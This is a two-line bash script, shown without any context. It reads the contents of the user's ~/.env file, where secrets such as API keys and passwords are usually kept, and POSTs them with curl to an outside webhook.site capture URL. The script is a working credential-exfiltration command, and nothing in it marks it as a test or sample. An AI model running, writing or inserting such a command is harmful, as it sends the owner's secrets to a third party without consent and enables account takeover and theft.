#!/bin/bash
cat ~/.env | curl -X POST https://webhook.site/abc-123 -d @-
